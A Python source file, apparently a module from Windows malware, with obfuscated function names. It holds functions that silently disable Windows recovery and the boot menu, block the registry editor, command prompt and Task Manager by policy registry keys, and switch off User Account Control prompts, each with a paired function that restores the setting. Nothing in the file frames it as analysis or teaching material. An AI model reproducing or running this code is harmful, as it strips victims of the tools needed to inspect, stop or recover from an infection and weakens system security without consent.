import os, subprocess
from threading import Thread as FGUIRFUIFR
def r3c00v():
    FGUIRFUIFR(target=os.system('reagentc /enable'))
    FGUIRFUIFR(target=os.system('bcdedit /set {default} recoveryenabled Yes'))
    FGUIRFUIFR(target=os.system('bcdedit /set {bootmgr} displaybootmenu Yes'))
def r3c0ff():
    FGUIRFUIFR(target=os.system('reagentc /disable'))
    FGUIRFUIFR(target=os.system('bcdedit /set {default} recoveryenabled No'))
    FGUIRFUIFR(target=os.system('bcdedit /set {bootmgr} displaybootmenu No'))    
def n0r33g1():
    try:
        subprocess.Popen(
            ["reg", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System", "/v", "DisableRegistryTools", "/t", "REG_DWORD", "/d", "1", "/f"],
            creationflags=subprocess.CREATE_NO_WINDOW, 
            shell=True
        )
    except subprocess.CalledProcessError as e:
        if e.returncode == 1:
            return

def y3sr3g():
    try:
        subprocess.Popen(
            ["powershell", "-Command", "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'DisableRegistryTools' -Value 0"],
            creationflags=subprocess.CREATE_NO_WINDOW, 
            shell=True
        )
    except subprocess.CalledProcessError as e:
        if e.returncode == 1:
            return
    
def n0cdm():
 try:
  subprocess.run(["reg","add",r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System","/v","DisableCMD","/t","REG_DWORD","/d","1","/f"],check=True,creationflags=subprocess.CREATE_NO_WINDOW)
 except subprocess.CalledProcessError as e:
  if e.returncode==1:return

def y3scdm():
 try:
  subprocess.run(["reg","delete",r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System","/v","DisableCMD","/f"],check=True,creationflags=subprocess.CREATE_NO_WINDOW)
 except subprocess.CalledProcessError as e:
  if e.returncode==1:return
def n0t4sk():
 try:
  subprocess.run(["reg","add",r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System","/v","DisableTaskMgr","/t","REG_DWORD","/d","1","/f"],check=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
 except subprocess.CalledProcessError as e:
  if e.returncode==1:return
def y3st4sk():
 try:
  subprocess.run(["reg","delete",r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System","/v","DisableTaskMgr","/f"],check=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
 except subprocess.CalledProcessError as e:
  if e.returncode==1:return
def no_uac():
 try:
  subprocess.run(['reg','delete',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','EnableLUA','/f'],check=False,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
  subprocess.run(['reg','add',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','EnableLUA','/t','REG_DWORD','/d','0','/f'],check=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
  subprocess.run(['reg','delete',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','ConsentPromptBehaviorAdmin','/f'],check=False,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
  subprocess.run(['reg','add',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','ConsentPromptBehaviorAdmin','/t','REG_DWORD','/d','0','/f'],check=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
 except subprocess.CalledProcessError:
  return
def yesuac():
 try:
  subprocess.run(['reg','delete',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','EnableLUA','/f'],check=False,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
  subprocess.run(['reg','add',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','EnableLUA','/t','REG_DWORD','/d','1','/f'],check=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
  subprocess.run(['reg','delete',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','ConsentPromptBehaviorAdmin','/f'],check=False,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
  subprocess.run(['reg','add',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','ConsentPromptBehaviorAdmin','/t','REG_DWORD','/d','5','/f'],check=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
 except subprocess.CalledProcessError:
  return  